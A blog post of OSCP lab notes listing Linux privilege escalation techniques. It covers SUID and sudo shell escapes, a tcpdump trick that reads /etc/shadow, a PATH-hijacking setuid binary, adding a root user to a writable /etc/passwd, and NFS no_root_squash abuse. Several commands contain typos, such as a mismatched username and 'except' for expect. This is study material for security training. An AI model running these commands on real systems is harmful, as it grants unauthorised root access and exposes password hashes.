

Privilege Escalation on Linux Platform
======================================


![](https://miro.medium.com/max/1400/1*JBJsc6zR69a2sSUmEhjuaw.png)

In this article, I will note and organize some privilege escalation skills used in my OSCP lab. Some are straightforward but fews are tricky. You have to refresh your brain and turn a corner. Before reading it, I highly recommend you to check [**g0tmi1t**](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)’s blog for basic Linux privilege escalation. Here comes the URL: [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

\\x01 Kernel Exploit
====================

For kernel exploit, you have to identify the kernel version and what distribution you used. You can type the following command to do it, and then search any related exploits on [exploit DB](https://www.exploit-db.com/), wget it, fix it, compile it and execute it. Here comes the commands to identify the kernel version and your distribution:

> $ uname -a  
> $ cat /etc/issue  
> $ cat /etc/\*-release  
> $ cat /etc/lsb-release  
> $ cat /etc/redhat-release  
> $ lsb\_release

In most cases, you can use [_sendpage_](https://www.exploit-db.com/exploits/9641) and [_dirtycow_](https://www.exploit-db.com/exploits/40839) both kernel exploits to do privilege escalation. And I would like to list two kernel exploits worth mentioned here.

The first one is udev kernel exploit. You can refer the following Mad Irish’s article.

[

Udev Exploit Allows Local Privilege Escalation
----------------------------------------------

### A nasty new udev vulnerability is floating around in the wild that allows local users on Linux systems with udev and…

www.madirish.net



](http://www.madirish.net/370)

The second one is regarding ReiserFS xattr vulnerability. If you see any folder mounted with reiserfs file system with xattr attribute set, it’s worth to give it a try. Here comes the reference link:

[

Offensive Security's Exploit Database Archive
---------------------------------------------

### usr/bin/env python ''' team-edward.py Linux Kernel http://jon.oberheide.org Information…

www.exploit-db.com



](https://www.exploit-db.com/exploits/12130)

\\x02 Exploit the service running as root
=========================================

There are 2 cases I encountered in OSCP lab are Samba 2.2.x and MySQL.

For Samba 2.2.x, please check the following link:

[

Offensive Security's Exploit Database Archive
---------------------------------------------

### Samba < 2.2.8 (Linux/BSD) - Remote Code Execution. CVE-4469CVE-2003-0201 . remote exploit for Multiple platform

www.exploit-db.com



](https://www.exploit-db.com/exploits/10)

For MySQL, if there is mysql daemon running as root, you could utilize UDF (User Define Function) to get root shell.

[

Offensive Security's Exploit Database Archive
---------------------------------------------

### MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2).. local exploit for Linux platform

www.exploit-db.com



](https://www.exploit-db.com/exploits/1518)

\\x03 Find anything with SUID / SGID permission
===============================================

Use the following 2 commands:

> $ find / -user root -perm -4000 2>/dev/null  
> $ find / -perm -2000 2>/dev/null

If you find the following command with SUID/SGID permission, perfect, you almost win.

nmap
----

> $ nmap --interactive  
> nmap> !sh
> 
> Another way below (if nmap doesn’t have interactive mode):  
> ($ echo “os.execute(‘/bin/sh’)” > /tmp/shell.nse)  
> ($ sudo nmap --script=/tmp/shell.nse)

vi
--

> $ vi  
> :!sh

find
----

> $ find / home -exec sh -i \\;

python
------

> $ python -c ‘import pty;pty.spawn(“/bin/sh”)’

strace
------

> $ strace -o /dev/null /bin/sh

tcpdump
-------

> $ echo $’id\\ncat /etc/shadow’ > /tmp/.shell  
> $ chmod +x /tmp/.shell  
> $ tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell -Z root

If you find out one script file with SUID permission, owned by root and executable by others, and this script file will execute some commands. You can play the trick to get root shell. For example here, this script will execute _scp_ command transferring some backup file to somewhere. Add . into $PATH and compile setuid.c, rename the compiled binary to scp and put it under current folder. And then run that script.

> $ export PATH=.:$PATH  
> $ cat setuid.c  
> #include <stdio.h>  
> int main(void)  
> {  
> setuid(0); setgid(0); seteuid(0); setegid(0); execvp(“/bin/sh”, NULL, NULL);  
> }  
> $ mv setuid scp  
> $ ./script.sh

\\x04 Abuse SUDO
================

Use the following command to show which command have allowed to the current user.

> $ sudo -l

And if you find the following command with NOPASSWD and root set in the output. You win again !!!  
zip
-------------------------------------------------------------------------------------------------------

> $ sudo zip /tmp/test.zip /tmp/test -T --unzip-command=”sh -c /bin/bash”

tar
---

> $ sudo tar cf /dev/null testfile --checkpoint=1 — checkpointaction=exec=/bin/bash

strace
------

> $ sudo strace -o/dev/null /bin/bash

tcpdump
-------

> $ echo $’id\\ncat /etc/shadow’ > /tmp/.shell  
> $ chmod +x /tmp/.shell  
> $ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell -Z root

nmap
----

> $ echo “os.execute(‘/bin/sh’)” > /tmp/shell.nse  
> $ sudo nmap --script=/tmp/shell.nse
> 
> Another way below:  
> ($ sudo nmap --interactive  
> nmap> !sh)

scp
---

> $ sudo scp -S /path/to/your/script x y

except
------

> $ sudo except spawn sh then sh

nano
----

> $ sudo nano -S /bin/bash

git
---

> $ sudo git help status  
> : !/bin/bash

gdb/ftp
-------

> $ sudo ftp  
> : !/bin/sh

\\x05 Find any writable file owned by root
==========================================

Please use the following command to find any writable files owned by root. You might be able to see the script file and add the needed command for your privilege escalation.

> $ find / -perm -002 -user root -type f -not-path “/proc/\*” 2>/dev/null

\\x06 Check /etc/passwd if writable
===================================

If you see /etc/passwd is writable, the only thing you should do is to echo one line to /etc/passed

> $ echo “tseruser::0:0:pawned:/root:/bin/bash” >> /etc/passwd  
> $ su testuser

\\x07 NFS root squashing
========================

According Wikipedia, root squash is a special mapping of the remote superuser (root) identity when using identity authentication (local user is the same as remote user). Under root squash, a client’s uid 0 (root) is mapped to 65534 (nobody). It is primarily a feature of NFS but may be available on other systems as well.

In the scenario which you use _showmount_ to find your target has NFS service up and running and you’re already in via anyway and you find you have the permission to edit _/etc/exports_ as well, for example, you can use _sudoedit_ to edit /etc/exports. You can put no\_root\_squash to disable root squash. Please see below:

> /home/userfolder \*(rw,no\_root\_squash)

And then you can _mount_ this folder with local root and put the copy of _/bin/bash_ into it. After this, try use the exploited normal account to execute this _/bin/bash_. You will get the heaven !!!

\\x08 Useful tools
==================

In the final section, I will introduce 3 useful tools for your PE. These tools can check and enumerate your target, show rich information for your PE on Linux platform.

[

rebootuser/LinEnum
------------------

### For more information visit www.rebootuser.com Note: Export functionality is currently in the experimental stage…

github.com



](https://github.com/rebootuser/LinEnum)

[

sleventyeleven/linuxprivchecker
-------------------------------

### linuxprivchecker.py -- a Linux Privilege Escalation Check Script - sleventyeleven/linuxprivchecker

github.com



](https://github.com/sleventyeleven/linuxprivchecker)

[

pentestmonkey/unix-privesc-check
--------------------------------

### Shell script to check for simple privilege escalation vectors on Unix systems Unix-privesc-checker is a script that…

github.com



](https://github.com/pentestmonkey/unix-privesc-check)

Hope you enjoy the article and wish you have a wonderful experience on your Linux privilege escalation. If this article helps you in anyway, please don’t hesitate to give me your clap.

[

Jie Liau
--------

](/?source=post_sidebar--------------------------post_sidebar-----------)

Follow

[

](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F8b3fbd0b1dd4&operation=register&redirect=https%3A%2F%2Fjieliau.medium.com%2Fprivilege-escalation-on-linux-platform-8b3fbd0b1dd4&user=Jie%20Liau&userId=f7c80a12b8ef&source=post_sidebar-----8b3fbd0b1dd4---------------------clap_sidebar-----------)

29

[

](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F8b3fbd0b1dd4&operation=register&redirect=https%3A%2F%2Fjieliau.medium.com%2Fprivilege-escalation-on-linux-platform-8b3fbd0b1dd4&user=Jie%20Liau&userId=f7c80a12b8ef&source=post_actions_footer-----8b3fbd0b1dd4---------------------clap_footer-----------)

29

[

](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F8b3fbd0b1dd4&operation=register&redirect=https%3A%2F%2Fjieliau.medium.com%2Fprivilege-escalation-on-linux-platform-8b3fbd0b1dd4&user=Jie%20Liau&userId=f7c80a12b8ef&source=post_actions_footer-----8b3fbd0b1dd4---------------------clap_footer-----------)

29

*   [Linux](https://medium.com/tag/linux)
*   [Penetration Testing](https://medium.com/tag/penetration-testing)
*   [Cyber](https://medium.com/tag/cyber)
*   [Information Security](https://medium.com/tag/information-security)
*   [Privilege Escalation](https://medium.com/tag/privilege-escalation)

[More from Jie Liau](/?source=follow_footer-------------------------------------)
---------------------------------------------------------------------------------

Follow

More From Medium
----------------

[Pros and Cons of Custom Software Solutions](https://sumatosoft.medium.com/pros-and-cons-of-custom-software-solutions-8b3e9f5524b8?source=post_internal_links---------0----------------------------)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[SumatoSoft](https://sumatosoft.medium.com/?source=post_internal_links---------0----------------------------)

[

![](https://miro.medium.com/max/60/0*MpjvCvK6FAYhdYW_.jpg?q=20)

![](https://miro.medium.com/fit/c/140/140/0*MpjvCvK6FAYhdYW_.jpg)





](https://sumatosoft.medium.com/pros-and-cons-of-custom-software-solutions-8b3e9f5524b8?source=post_internal_links---------0----------------------------)

[Flutter 1: Navigation Drawer & Routes](https://engineering.classpro.in/flutter-1-navigation-drawer-routes-8b43a201251e?source=post_internal_links---------1----------------------------)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[Aravind](https://medium.com/@vemarav?source=post_internal_links---------1----------------------------) in [Engineering at Classpro](https://engineering.classpro.in/?source=post_internal_links---------1----------------------------)

[

![](https://miro.medium.com/freeze/max/60/1*WGcuuHVSwWD9vVgeWj9Vsg.gif?q=20)

![](https://miro.medium.com/fit/c/140/140/1*WGcuuHVSwWD9vVgeWj9Vsg.gif)





](https://engineering.classpro.in/flutter-1-navigation-drawer-routes-8b43a201251e?source=post_internal_links---------1----------------------------)

[Dictionaries in Python](https://medium.datadriveninvestor.com/dictionaries-in-python-8b4069765b6b?source=post_internal_links---------2----------------------------)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

[Vidya Menon](https://menonvid.medium.com/?source=post_internal_links---------2----------------------------) in [DataDrivenInvestor](https://medium.datadriveninvestor.com/?source=post_internal_links---------2----------------------------)

[

![](https://miro.medium.com/max/60/0*5Ver8YBGh5jga5t8?q=20)

![](https://miro.medium.com/fit/c/140/140/0*5Ver8YBGh5jga5t8)





](https://medium.datadriveninvestor.com/dictionaries-in-python-8b4069765b6b?source=post_internal_links---------2----------------------------)

[The day i “coded” a feature for Windows 10](https://medium.com/@gabrielbb0306/the-day-i-coded-a-feature-for-windows-10-8b3ea0f113e4?source=post_internal_links---------3----------------------------)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[Gabriel Basilio Brito](https://medium.com/@gabrielbb0306?source=post_internal_links---------3----------------------------)

[

![](https://miro.medium.com/max/60/1*74jjVw2CDVi7cq14_uRodA.png?q=20)

![](https://miro.medium.com/fit/c/140/140/1*74jjVw2CDVi7cq14_uRodA.png)





](https://medium.com/@gabrielbb0306/the-day-i-coded-a-feature-for-windows-10-8b3ea0f113e4?source=post_internal_links---------3----------------------------)

[6 steps to start increasing quality of your code](https://tomasz-swistak.medium.com/6-steps-to-start-increasing-quality-of-your-code-b063ed6fbae3?source=post_internal_links---------4----------------------------)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[Tomasz Świstak](https://tomasz-swistak.medium.com/?source=post_internal_links---------4----------------------------)

[

![](https://miro.medium.com/max/60/1*6_VUii6jvQ2aFLBbwkt9yw.jpeg?q=20)

![](https://miro.medium.com/fit/c/140/140/1*6_VUii6jvQ2aFLBbwkt9yw.jpeg)





](https://tomasz-swistak.medium.com/6-steps-to-start-increasing-quality-of-your-code-b063ed6fbae3?source=post_internal_links---------4----------------------------)

[Multisite links in EXM](https://markgibbons25.medium.com/multisite-links-in-exm-a5ae62e65409?source=post_internal_links---------5----------------------------)
---------------------------------------------------------------------------------------------------------------------------------------------------------------

[Mark Gibbons](https://markgibbons25.medium.com/?source=post_internal_links---------5----------------------------)

[

![](https://miro.medium.com/max/60/1*hn4v1tCaJy7cWMyb0bpNpQ.png?q=20)

![](https://miro.medium.com/fit/c/140/140/1*hn4v1tCaJy7cWMyb0bpNpQ.png)





](https://markgibbons25.medium.com/multisite-links-in-exm-a5ae62e65409?source=post_internal_links---------5----------------------------)

[Introduction to Graphs for CP (Part II, implementation & algorithms)](https://medium.com/programming-club-iit-kanpur/introduction-to-graphs-for-cp-part-ii-implementation-algorithms-a5ac5ed7a48a?source=post_internal_links---------6----------------------------)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[Aditya Ranjan](https://medium.com/@zark84010?source=post_internal_links---------6----------------------------) in [Programming Club, IIT Kanpur](https://medium.com/programming-club-iit-kanpur?source=post_internal_links---------6----------------------------)

[

![](https://miro.medium.com/freeze/max/60/1*OKOHT5ca8H3X0ChwnZFDPA.gif?q=20)

![](https://miro.medium.com/fit/c/140/140/1*OKOHT5ca8H3X0ChwnZFDPA.gif)





](https://medium.com/programming-club-iit-kanpur/introduction-to-graphs-for-cp-part-ii-implementation-algorithms-a5ac5ed7a48a?source=post_internal_links---------6----------------------------)

[Dealing With Data As Swift as a Coursing River](https://betterprogramming.pub/dealing-with-data-as-swift-as-a-coursing-river-a5a86a5b168a?source=post_internal_links---------7----------------------------)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[SeattleDataGuy](https://medium.com/@SeattleDataGuy?source=post_internal_links---------7----------------------------) in [Better Programming](https://betterprogramming.pub/?source=post_internal_links---------7----------------------------)

[

![](https://miro.medium.com/max/60/1*srK0aV0It2F6BOFfzEqIXw.jpeg?q=20)

![](https://miro.medium.com/fit/c/140/140/1*srK0aV0It2F6BOFfzEqIXw.jpeg)





](https://betterprogramming.pub/dealing-with-data-as-swift-as-a-coursing-river-a5a86a5b168a?source=post_internal_links---------7----------------------------)

window.\_\_BUILD\_ID\_\_="main-20210723-214206-cb03029f42"window.\_\_GRAPHQL\_URI\_\_ = "https://jieliau.medium.com/\_/graphql"window.\_\_PRELOADED\_STATE\_\_ = {"auroraPage":{"isAuroraPageEnabled":true},"bookReader":{"assets":{},"reader":{"currentAsset":null,"currentGFI":null,"settingsPanelIsOpen":false,"settings":{"fontFamily":"CHARTER","fontScale":"M","publisherStyling":true,"textAlignment":"start","theme":"White","lineSpacing":0,"wordSpacing":0,"letterSpacing":0},"internalNavCounter":0,"currentSelection":null}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":\["group-edgeCachePosts","post-8b3fbd0b1dd4","user-f7c80a12b8ef"\],"serverVariantState":"cee1a1873b83850a7ea5a91c46f8ff6f48f3ac5eb281cdf1eabe0f32b4d10655","middlewareEnabled":true,"cacheStatus":"DYNAMIC"},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"routingEntity":{"type":"USER","id":"f7c80a12b8ef","explicit":true}},"debug":{"requestId":"3201ba5b-2d84-4138-94da-9e64c95572c6","hybridDevServices":\[\],"showBookReaderDebugger":false,"originalSpanCarrier":{"ot-tracer-spanid":"56a144793676f403","ot-tracer-traceid":"5fd1946ef1d1ab51","ot-tracer-sampled":"true"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedGoogleOneTap":null,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\\u002F\\u002Fjieliau.medium.com\\u002Fprivilege-escalation-on-linux-platform-8b3fbd0b1dd4","host":"jieliau.medium.com","hostname":"jieliau.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"queryString":"","currentHash":""},"tracing":{},"config":{"nodeEnv":"production","version":"main-20210723-214206-cb03029f42","isTaggedVersion":false,"isMediumDotApp":false,"target":"production","productName":"Medium","publicUrl":"https:\\u002F\\u002Fcdn-client.medium.com\\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\\u002F\\u002Fglyph.medium.com","branchKey":"key\_live\_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","lightStep":{"name":"lite-web","host":"lightstep.medium.systems","token":"ce5be895bef60919541332990ac9fef2","appVersion":"main-20210723-214206-cb03029f42"},"algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium\_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw\_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI\_85Wb8melS7Zj6ziuf99Yot5","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20210723-214206-cb03029f42","commit":"cb03029f4242c1696496699ea3be61b056fdb4cc"}},"datacenter":"us"},"googleAnalyticsCode":"UA-24232453-2","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium"},"signInWallCustomDomainCollectionIds":\["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"\],"mediumOwnedAndOperatedCollectionIds":\["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"\],"tierOneDomains":\["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"\],"topicsToFollow":\["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"\],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","popular":"popular","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1\*dmbNkD5D-u45r44go\_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"1\*OMF3fSqH8t4xBJ9-6oZDZw.png","height":106,"width":545},"postLogo":{"imageId":"1\*kFrc4tBFM\_tCis-2Ic87WA.png","height":810,"width":1440},"postPreviewImage":{"imageId":"1\*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\\u002F\\u002Fhelp.medium.com\\u002Fhc\\u002Fen-us\\u002Farticles\\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\\u002F\\u002Fcdn-images-1.medium.com\\u002Fmax\\u002F980\\u002F1\*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\\u002F\\u002Fhelp.medium.com\\u002Fhc\\u002Fen-us\\u002Farticles\\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\\u002F\\u002Fcdn-images-1.medium.com\\u002Fmax\\u002F596\\u002F1\*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\\u002F\\u002Fhelp.medium.com\\u002Fhc\\u002Fen-us\\u002Farticles\\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\\u002F\\u002Fmiro.medium.com\\u002Fmax\\u002F264\\u002F1\*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\\u002F\\u002Fhelp.medium.com\\u002Fhc\\u002Fen-us\\u002Farticles\\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\\u002F\\u002Fmiro.medium.com\\u002Fmax\\u002F540\\u002F1\*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\\u002F\\u002Fhelp.medium.com\\u002Fhc\\u002Fen-us\\u002Farticles\\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\\u002F\\u002Fcdn-images-1.medium.com\\u002Fmax\\u002F383\\u002F1\*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\\u002F\\u002Fhelp.medium.com\\u002Fhc\\u002Fen-us\\u002Farticles\\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\\u002F\\u002Fmiro.medium.com\\u002Fmax\\u002F540\\u002F1\*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\\u002F\\u002Fhelp.medium.com\\u002Fhc\\u002Fen-us\\u002Farticles\\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\\u002F\\u002Fmiro.medium.com\\u002Fmax\\u002F540\\u002F1\*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID\_APPLICABLE\_TAG\_SLUGS":\[\],"COVID\_APPLICABLE\_TOPIC\_NAMES":\[\],"COVID\_APPLICABLE\_TOPIC\_NAMES\_FOR\_TOPIC\_PAGE":\[\],"COVID\_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":\[{"start":66,"end":73,"href":"https:\\u002F\\u002Fwww.cdc.gov\\u002Fcoronavirus\\u002F2019-nCoV"}\]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":\[{"start":37,"end":45,"href":"https:\\u002F\\u002Fhelp.medium.com\\u002Fhc\\u002Fen-us\\u002Fcategories\\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\\u002F\\u002Fwww.cdc.gov\\u002Fcoronavirus\\u002F2019-nCoV"}\]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":\[{"start":56,"end":70,"href":"https:\\u002F\\u002Fmedium.com\\u002Fmembership"},{"start":138,"end":145,"href":"https:\\u002F\\u002Fwww.cdc.gov\\u002Fcoronavirus\\u002F2019-nCoV"}\]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":\[{"start":45,"end":59,"href":"https:\\u002F\\u002Fmedium.com\\u002Fmembership"},{"start":127,"end":134,"href":"https:\\u002F\\u002Fwww.cdc.gov\\u002Fcoronavirus\\u002F2019-nCoV"}\]}},"COVID\_BANNER\_POST\_ID\_OVERRIDE\_WHITELIST":\["3b31a67bff4a"\]},"sharedVoteMessaging":{"TAGS":\["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"\],"TOPICS":\["politics","election"\],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":\[{"start":46,"end":50,"href":"https:\\u002F\\u002Fcookpolitical.com\\u002F2020-national-popular-vote-tracker"}\]},"EXCLUDE\_POSTS":\["397ef29e3ca5"\]},"embedPostRules":\[\],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production\_zjkj96jm\_m56f8fqpf7ngnrd4","paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig\_amnhvlMVX87otaq58niAg9iuLktVNF\_1WCMnN7v","stripePublishableKey":"pk\_live\_7FReX44VnNIInZwrIIx6ghjl"},"session":{"xsrf":""}}window.\_\_APOLLO\_STATE\_\_ = {"ROOT\_QUERY":{"\_\_typename":"Query","meterPost({\\"postId\\":\\"8b3fbd0b1dd4\\",\\"postMeteringOptions\\":{\\"referrer\\":\\"https:\\u002F\\u002Fwww.google.com\\u002F\\",\\"sk\\":null,\\"source\\":null}})":{"\_\_ref":"MeteringInfo:{}"},"postResult({\\"id\\":\\"8b3fbd0b1dd4\\"})":{"\_\_ref":"Post:8b3fbd0b1dd4"},"getPredefinedCatalog({\\"type\\":\\"READING\_LIST\\",\\"userId\\":\\"f7c80a12b8ef\\"})":{"\_\_typename":"Forbidden"},"catalogsByUser":{"userId:f7c80a12b8ef,type:LISTS,limit:1":{"\_\_typename":"CatalogsConnection","catalogs":\[\]}}},"MeteringInfo:{}":{"\_\_typename":"MeteringInfo","postIds":\[\],"maxUnlockCount":3,"unlocksRemaining":0},"User:f7c80a12b8ef":{"id":"f7c80a12b8ef","\_\_typename":"User","customStyleSheet":null,"isSuspended":false,"name":"Jie Liau","bio":"","imageId":"0\*P5y\_14cIShXWLm0M.jpg","hasCompletedProfile":false,"username":"jieliau","isAuroraVisible":true,"mediumMemberAt":0,"socialStats":{"\_\_typename":"SocialStats","followerCount":36,"followingCount":16,"collectionFollowingCount":3},"customDomainState":{"\_\_typename":"CustomDomainState","live":{"\_\_typename":"CustomDomain","domain":"jieliau.medium.com","status":"ACTIVE","isSubdomain":true}},"hasSubdomain":true,"viewerEdge":{"\_\_ref":"UserViewerEdge:userId:f7c80a12b8ef-viewerId:lo\_df40609a1787"},"bookAuthor":null,"viewerIsUser":false,"newsletterV3":null,"homepagePostsConnection({\\"paging\\":{\\"limit\\":1}})":{"\_\_typename":"PostConnection","posts":\[{"\_\_ref":"Post:d4a9fcc06f6d"}\]},"allowNotes":true,"twitterScreenName":"0xJieLiau","followedCollections":3,"atsQualifiedAt":0},"UserViewerEdge:userId:f7c80a12b8ef-viewerId:lo\_df40609a1787":{"id":"userId:f7c80a12b8ef-viewerId:lo\_df40609a1787","\_\_typename":"UserViewerEdge","createdAt":0,"lastPostCreatedAt":0,"isAllowEdsEnabled":false,"isFollowing":false,"isUser":false},"Post:d4a9fcc06f6d":{"id":"d4a9fcc06f6d","\_\_typename":"Post"},"Paragraph:600154e55c0b\_0":{"id":"600154e55c0b\_0","\_\_typename":"Paragraph","name":"90fe","text":"Privilege Escalation on Linux Platform","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_1":{"id":"600154e55c0b\_1","\_\_typename":"Paragraph","name":"a14f","text":"","type":"IMG","href":null,"layout":"INSET\_CENTER","metadata":{"\_\_ref":"ImageMetadata:1\*JBJsc6zR69a2sSUmEhjuaw.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_2":{"id":"600154e55c0b\_2","\_\_typename":"Paragraph","name":"48b0","text":"In this article, I will note and organize some privilege escalation skills used in my OSCP lab. Some are straightforward but fews are tricky. You have to refresh your brain and turn a corner. Before reading it, I highly recommend you to check g0tmi1t’s blog for basic Linux privilege escalation. Here comes the URL: 